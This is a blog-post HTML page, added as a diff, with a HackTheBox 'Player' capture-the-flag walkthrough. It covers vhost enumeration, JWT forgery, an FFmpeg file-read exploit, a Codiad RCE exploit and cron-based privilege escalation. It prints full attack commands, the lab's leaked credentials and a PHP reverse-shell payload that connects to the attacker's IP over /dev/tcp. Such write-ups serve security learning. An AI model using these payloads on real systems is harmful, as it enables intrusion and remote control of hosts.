@@ -1,0 +1,293 @@
+<!DOCTYPE html>
+<html lang="zh-cn" dir="ltr">
+  <head>
+  <meta charset="utf-8" />
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  <title>HackTheBox - WriteUp 16 &middot; Pat~ Pat~ Meow~</title>
+  <meta name="description" content="HackTheBox 练手 - Player - Code Review with FFMPEG Vuln" />
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/normalize/8.0.1/normalize.min.css" />
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.10.0/dist/katex.min.css" integrity="sha384-9eLZqc9ds8eNjO3TmqPeYcDj8n+Qfa4nuSiGYa6DjLNcv9BtN69ZIulL9+8CqC9Y" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://www.kmahyyg.xyz/css/main.min.css" />
+  
+<script type="application/javascript">
+var doNotTrack = false;
+if (!doNotTrack) {
+	(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+	(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+	m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+	})(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
+	ga('create', 'UA-123948588-1', 'auto');
+	
+	ga('send', 'pageview');
+}
+</script>
+
+  <style>
+    body {
+      background: #ecedef url("https://alicdn.kmahyyg.xyz/asset_files/aether/bgimg.webp") repeat;
+    }
+  </style>
+</head>
+  <body class="single-body">
+    <nav class="nav-bar side-padding">
+  <h1 class="nav-header"><a href="https://www.kmahyyg.xyz/" class="nav-text">Patrick Young</a></h1>
+  <div class="hamburger-menu">
+    <button onclick="hamburgerMenuPressed.call(this)" aria-haspopup="true" aria-expanded="false" aria-controls="menu" aria-label="Menu">
+      <span></span>
+      <span></span>
+    </button>
+    <ul id="menu" class="hamburger-menu-overlay">
+      <li><a href="https://www.kmahyyg.xyz/" class="hamburger-menu-overlay-link">Home</a></li>
+      <li><a href="https://www.kmahyyg.xyz/express-page/" class="hamburger-menu-overlay-link">Express Inc</a></li>
+      <li><a href="https://www.kmahyyg.xyz/about-me-page/" class="hamburger-menu-overlay-link">About</a></li>
+      <li><a href="https://www.kmahyyg.xyz/archlinux-bug-page/" class="hamburger-menu-overlay-link">Arch Linux</a></li>
+      <li><a href="https://www.kmahyyg.xyz/donate-page/" class="hamburger-menu-overlay-link">Donate</a></li>
+      <li><a href="https://www.kmahyyg.xyz/categories/code" class="hamburger-menu-overlay-link">Code</a></li><li><a href="https://www.kmahyyg.xyz/categories/life" class="hamburger-menu-overlay-link">Life</a></li><li><a href="https://www.kmahyyg.xyz/categories/network" class="hamburger-menu-overlay-link">Network</a></li><li><a href="https://www.kmahyyg.xyz/categories/school" class="hamburger-menu-overlay-link">School</a></li><li><a href="https://www.kmahyyg.xyz/categories/tech" class="hamburger-menu-overlay-link">Tech</a></li>
+    </ul>
+  </div>
+</nav>
+    <main class="content side-text-padding">
+      <article class="post ">
+        <header class="post-header">
+        	<h1 class="post-title">HackTheBox - WriteUp 16</h1>
+          <p class="post-date">Posted <time datetime="2019-07-17">Jul 17, 2019</time></p>
+        </header>
+        
+        <picture class="post-figure">
+            
+            <source srcset="https://alicdn.kmahyyg.xyz/asset_files/aether/cat_tech.webp">
+          <img src="https://alicdn.kmahyyg.xyz/asset_files/aether/cat_tech.webp" >
+        </picture>
+        
+        
+
+<h1 id="player">Player</h1>
+
+<p>Nmap enum 22(SSH 6.6.1p1), 80(Apache Web 2.4.7 With PHP 5.5.9), 6686(SSH 7.2p1)</p>
+
+<h2 id="user">User</h2>
+
+<p>First, access 80, get 403. We need enum vhost.</p>
+
+<p>Use gobuster here: <code>gobuster vhost -r -u http://player.htb -o /tmp/player1.log -w ./subdomains-top1mil-20000.txt -s 200</code>, Found: <code>dev</code> <code>staging</code> <code>chat</code></p>
+
+<p>Add the following lines into <code>/etc/hosts</code>:</p>
+
+<pre><code>10.10.10.145 dev.player.htb
+10.10.10.145 staging.player.htb
+10.10.10.145 chat.player.htb
+10.10.10.145 player.htb
+</code></pre>
+
+<p>Check <code>chat</code>, you&rsquo;ll know there&rsquo;s application backup file disclosure and credentials leak in other places.</p>
+
+<p>Then enum dir <code>gobuster dir -u http://staging.player.htb -s 200,204,301,302,307 -o /tmp/dirbplayer.log -w ./directory-list-2.3-medium.txt -x html,php,htm,txt</code>, nothing special.</p>
+
+<p>Then enum dir <code>gobuster dir -u http://player.htb -s 200,204,301,302,307 -o /tmp/dirbplayer_main.log -w ./directory-list-2.3-medium.txt -x html,php,htm,txt</code>, found <code>/launcher</code>.</p>
+
+<p>After that, go to Staging, Check all pages, found a contact form, submit anything, you&rsquo;ll see a error page flashing&hellip; Then, enable burpsuite, catch the local file disclosure:</p>
+
+<pre><code class="language-php">array(3) { 
+    [0]=&gt; array(4) { 
+        [&quot;file&quot;]=&gt; string(28) &quot;/var/www/staging/contact.php&quot; 
+        [&quot;line&quot;]=&gt; int(6) 
+        [&quot;function&quot;]=&gt; string(1) &quot;c&quot; 
+        [&quot;args&quot;]=&gt; array(1) { 
+            [0]=&gt; &amp;string(9) &quot;Cleveland&quot; } 
+        } 
+    [1]=&gt; array(4) { 
+        [&quot;file&quot;]=&gt; string(28) &quot;/var/www/staging/contact.php&quot; 
+        [&quot;line&quot;]=&gt; int(3) 
+        [&quot;function&quot;]=&gt; string(1) &quot;b&quot; 
+        [&quot;args&quot;]=&gt; array(1) { 
+            [0]=&gt; &amp;string(5) &quot;Glenn&quot; } 
+        } 
+    [2]=&gt; array(4) { 
+        [&quot;file&quot;]=&gt; string(28) &quot;/var/www/staging/contact.php&quot; 
+        [&quot;line&quot;]=&gt; int(11) 
+        [&quot;function&quot;]=&gt; string(1) &quot;a&quot; 
+        [&quot;args&quot;]=&gt; array(1) { 
+            [0]=&gt; &amp;string(5) &quot;Peter&quot; } 
+        } 
+    } 
+Database connection failed.
+Unknown variable user in /var/www/backup/service_config fatal error in /var/www/staging/fix.php
+</code></pre>
+
+<p>Check the source code of Dev, app.js showed Codiad WebIDE, 0-Day RCE can be found here: <a href="https://github.com/WangYihang/Codiad-Remote-Code-Execute-Exploit">https://github.com/WangYihang/Codiad-Remote-Code-Execute-Exploit</a></p>
+
+<p>Then check <code>player.htb/launcher</code> source code, you&rsquo;ll get a php named in a strange way. Check about backup file, found: <code>http://player.htb/launcher/dee8dc8a47256c64630d803a4c40786c.php~</code>, It&rsquo;s about JSON Web Token, according to its code, The JWT Token can be build as is:</p>
+
+<ul>
+<li>Algorithm: HS256</li>
+<li>Type: JWT</li>
+<li>Base64Encoded Secret: /S0/R@nd0m/P@ss/</li>
+<li>Correct Payload:  <code>{&quot;project&quot;: &quot;PlayBuff&quot;,&quot;access_code&quot;:&quot;0E76658526655756207688271159624026011393&quot;}</code></li>
+</ul>
+
+<p>So, Use the above param, you get the cookie: <code>access = eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJwcm9qZWN0IjoiUGxheUJ1ZmYiLCJhY2Nlc3NfY29kZSI6IjBFNzY2NTg1MjY2NTU3NTYyMDc2ODgyNzExNTk2MjQwMjYwMTEzOTMifQ.GgZP6ZYiWPFtzyHxGVn6Cl_PFkt0UpBe8cTyTF13ot4</code></p>
+
+<p>Clear all your current cookies, then set cookie above, open <code>http://player.htb/launcher/</code>, input anything into the form, then submit. You&rsquo;ll be redirected to: <code>http://player.htb/launcher/7F2dcsSdZo6nj3SNMTQ1/</code>, You&rsquo;ll see a Secure Video Page. Mostly, video convert use FFMpeg, so let&rsquo;s search, found this: <code>https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files/CVE%20Ffmpeg%20HLS</code></p>
+
+<p>Run exploit with: <code>python3 ./gen_avi_bypass.py file:///var/www/backup/service_config backup_servc.avi</code> to read the file we just get from error message. Get output downloaded. You will found a cred: <code>telegen:d-bC|jC!2uepS/w</code>.</p>
+
+<p>Try to logged in via SSH, get limited shell and cannot escape. Next, try <code>https://www.exploit-db.com/exploits/39569</code> , after you get xauth shell, run <code>.readfile /var/www/staging/fix.php</code>, you will get another creds: <code>peter:CQXpm\z)G5D#%S$y=</code></p>
+
+<p>Logged into dev site, you found no plugin manager, so you can&rsquo;t upload anything. Try <code>https://github.com/WangYihang/Codiad-Remote-Code-Execute-Exploit</code>, with <code>python2 ./exploit.py http://dev.player.htb/ peter &quot;CQXpm\\z)G5D#%S\$y=&quot; 10.10.16.80 4499 linux</code>, you&rsquo;ll get a reverse shell as <code>www-data</code>.</p>
+
+<p>Use Python 3 to spawn a pty, <code>python3 -c &quot;import pty; pty.spawn('/bin/bash')&quot;</code>, then <code>su -s /bin/bash telegen</code>, use the creds above, you can access the user flag.</p>
+
+<h2 id="root">Root</h2>
+
+<p>Run <code>pspy64</code>, then upload a php file:</p>
+
+<pre><code class="language-php">&lt;?php 
+shell_exec(&quot;bash -c 'bash -i &amp;&gt;/dev/tcp/10.10.16.80/23032 0&lt;&amp;1'&quot;); 
+?&gt;
+</code></pre>
+
+<p>According to pspy, cron run a PHP per minute, which located at: <code>/var/lib/playbuff/buff.php</code></p>
+
+<pre><code class="language-php">&lt;?php
+include(&quot;/var/www/html/launcher/dee8dc8a47256c64630d803a4c40786g.php&quot;);
+class playBuff
+{
+        public $logFile=&quot;/var/log/playbuff/logs.txt&quot;;
+        public $logData=&quot;Updated&quot;;
+
+        public function __wakeup()
+        {
+                file_put_contents(__DIR__.&quot;/&quot;.$this-&gt;logFile,$this-&gt;logData);
+        }
+}
+$buff = new playBuff();
+$serialbuff = serialize($buff);
+$data = file_get_contents(&quot;/var/lib/playbuff/merge.log&quot;);
+if(unserialize($data))
+{
+        $update = file_get_contents(&quot;/var/lib/playbuff/logs.txt&quot;);
+        $query = mysqli_query($conn, &quot;update stats set status='$update' where id=1&quot;);
+        if($query)
+        {
+                echo 'Update Success with serialized logs!';
+        }
+}
+else
+{
+        file_put_contents(&quot;/var/lib/playbuff/merge.log&quot;,&quot;no issues yet&quot;);
+        $update = file_get_contents(&quot;/var/lib/playbuff/logs.txt&quot;);
+        $query = mysqli_query($conn, &quot;update stats set status='$update' where id=1&quot;);
+        if($query)
+        {
+                echo 'Update Success!';
+        }
+}
+?&gt;
+</code></pre>
+
+<p>The file content of <code>/var/www/html/launcher/dee8dc8a47256c64630d803a4c40786g.php</code>:</p>
+
+<pre><code class="language-php">&lt;?php
+$servername = &quot;localhost&quot;;
+$username = &quot;root&quot;;
+$password = &quot;&quot;;
+$dbname = &quot;integrity&quot;;
+
+// Create connection
+$conn = new mysqli($servername, $username, $password, $dbname);
+// Check connection
+if ($conn-&gt;connect_error) {
+    die(&quot;Connection failed: &quot; . $conn-&gt;connect_error);
+}
+?&gt;
+</code></pre>
+
+<p>Included PHP will be executed, so just append the shell you just uploaded to <code>dee8dc8a47256c64630d803a4c40786g.php</code>: <code>cat shell.php &gt;&gt; dee8dc8a47256c64630d803a4c40786g.php</code>.</p>
+
+<p>Then open an nc before you append, you will get a root shell.</p>
+
+<p>(END)</p>
+
+<h1 id="referrence">Referrence</h1>
+
+<ul>
+<li><a href="https://www.exploit-db.com/exploits/39569">https://www.exploit-db.com/exploits/39569</a></li>
+<li><a href="https://www.rapid7.com/db/vulnerabilities/http-php-temporary-file-source-disclosure">https://www.rapid7.com/db/vulnerabilities/http-php-temporary-file-source-disclosure</a></li>
+<li><a href="https://github.com/WangYihang/Codiad-Remote-Code-Execute-Exploit">https://github.com/WangYihang/Codiad-Remote-Code-Execute-Exploit</a></li>
+<li><a href="https://jwt.io">https://jwt.io</a></li>
+<li><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files/CVE%20Ffmpeg%20HLS">https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files/CVE%20Ffmpeg%20HLS</a></li>
+<li><a href="https://github.com/firebase/php-jwt">https://github.com/firebase/php-jwt</a></li>
+<li><a href="https://stackoverflow.com/questions/12823770/does-php-code-execute-when-included">https://stackoverflow.com/questions/12823770/does-php-code-execute-when-included</a></li>
+</ul>
+
+<h1 id="further-reading-improvement">Further Reading: Improvement</h1>
+
+<ul>
+<li><a href="https://www.netsparker.com/blog/web-security/untrusted-data-unserialize-php/">https://www.netsparker.com/blog/web-security/untrusted-data-unserialize-php/</a></li>
+<li><a href="https://www.notsosecure.com/remote-code-execution-via-php-unserialize/">https://www.notsosecure.com/remote-code-execution-via-php-unserialize/</a></li>
+<li><a href="https://securitycafe.ro/2015/01/05/understanding-php-object-injection/">https://securitycafe.ro/2015/01/05/understanding-php-object-injection/</a></li>
+<li><a href="https://www.digitalocean.com/community/tutorials/how-to-protect-your-server-against-the-dirty-cow-linux-vulnerability">https://www.digitalocean.com/community/tutorials/how-to-protect-your-server-against-the-dirty-cow-linux-vulnerability</a></li>
+</ul>
+
+      </article>
+      <div id="disqus_thread"></div>
+<script type="application/javascript">
+    var disqus_config = function () {
+    
+    
+    
+    };
+    (function() {
+        if (["localhost", "127.0.0.1"].indexOf(window.location.hostname) != -1) {
+            document.getElementById('disqus_thread').innerHTML = 'Disqus comments not available by default when the website is previewed locally.';
+            return;
+        }
+        var d = document, s = d.createElement('script'); s.async = true;
+        s.src = '//' + "kmahyyg" + '.disqus.com/embed.js';
+        s.setAttribute('data-timestamp', +new Date());
+        (d.head || d.body).appendChild(s);
+    })();
+</script>
+<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+<a href="https://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
+    </main>
+    <nav class="end-nav side-padding">
+      
+      <a ontouchstart="cardPressed.call(this)" ontouchend="cardReleased.call(this)" ontouchmove="cardReleased.call(this)" 
+  href="https://www.kmahyyg.xyz/hioscp/2019-htb-writeup15/" class="card blog-card" rel="bookmark" >
+    
+    <div class="card-img-container">
+      <p class="card-img-overlay">Next Article</p>
+      <picture>
+        
+        <source srcset="https://alicdn.kmahyyg.xyz/asset_files/aether/cat_tech.webp">
+        <img src="https://alicdn.kmahyyg.xyz/asset_files/aether/cat_tech.webp" class="card-img" >
+      </picture>
+    </div>
+    
+  <article class="card-body">
+    <h2 class="card-title">HackTheBox - WriteUp 15</h2>
+    <p class="card-text">HackTheBox 练手 - Craft - Code review</p>
+    <div class="card-subtext muted-text">
+      <p>Posted <time datetime="2019-07-16 716:00">Jul 16, 2019</time></p>
+      <p>#tech </p>
+    </div>
+  </article>
+</a>
+      
+      <a ontouchstart="cardPressed.call(this)" ontouchend="cardReleased.call(this)" ontouchmove="cardReleased.call(this)" 
+  href="https://www.kmahyyg.xyz/" class="card home-card" style="background-image: url( https://alicdn.kmahyyg.xyz/asset_files/aether/backtohome.webp )" rel="bookmark" >
+  Home
+</a>
+    </nav>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.13.1/highlight.min.js"></script>
+<script defer src="https://cdn.jsdelivr.net/npm/katex@0.10.0/dist/katex.min.js" integrity="sha384-K3vbOmF2BtaVai+Qk37uypf7VrgBubhQreNQe9aGsz9lB63dIFiQVlJbr92dw2Lx" crossorigin="anonymous"></script>
+<script defer src="https://cdn.jsdelivr.net/npm/katex@0.10.0/dist/contrib/auto-render.min.js" integrity="sha384-kmZOZB5ObwgQnS/DuDg6TScgOiWWBiVt0plIRkZCmE6rDZGrEOQeHM5PcHi+nyqe" crossorigin="anonymous"
+    onload="renderMathInElement(document.body);"></script>
+<script src="https://www.kmahyyg.xyz/js/core.js"></script>
+<script>
+  hljs.initHighlightingOnLoad();
+</script>
+  </body>
+</html>
